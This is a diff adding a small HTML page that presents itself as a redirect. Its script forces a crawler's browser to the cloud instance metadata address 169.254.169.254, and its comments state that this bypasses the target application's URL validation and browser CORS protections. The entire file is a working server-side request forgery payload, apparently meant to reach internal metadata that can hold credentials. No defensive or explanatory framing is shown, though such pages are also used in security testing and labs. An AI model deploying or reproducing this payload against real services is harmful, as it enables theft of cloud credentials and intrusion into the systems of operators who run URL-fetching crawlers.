@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <h1>Navigating to target...</h1>
+    <script>
+        // Force the crawler's browser to navigate directly to the internal IP.
+        // This bypasses the application's initial URL validation AND browser CORS/Mixed Content.
+        window.location.replace("http://169.254.169.254/latest/meta-data/");
+    </script>
+</body>
+</html>
